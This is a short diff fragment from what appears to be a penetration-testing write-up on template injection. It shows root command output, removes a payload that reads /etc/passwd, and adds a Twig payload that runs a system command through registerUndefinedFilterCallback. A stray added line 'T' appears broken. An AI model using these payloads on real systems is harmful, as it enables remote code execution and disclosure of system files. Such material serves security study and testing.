@@ -244,6 +244,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 We are root.
 
+T
 ```
-"{{ '/etc/passwd' |file_excerpt(1,30) }}"@
+${{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 ```
